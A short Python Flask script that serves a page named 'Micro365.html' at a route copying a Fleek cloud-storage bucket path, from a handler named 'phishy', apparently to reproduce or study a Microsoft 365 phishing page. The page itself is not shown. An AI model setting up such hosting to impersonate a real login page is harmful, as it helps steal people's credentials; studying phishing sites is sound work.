from flask import Flask, render_template

app = Flask(__name__, static_folder='', template_folder='storageapi.fleek.co/3abfd30b-1c83-46d5-b131-46685cff1be6-bucket')

@app.route('/3abfd30b-1c83-46d5-b131-46685cff1be6-bucket/Micro365.html')
def phishy():
    return render_template('Micro365.html')

if __name__ == '__main__':
    app.run('0.0.0.0', 80)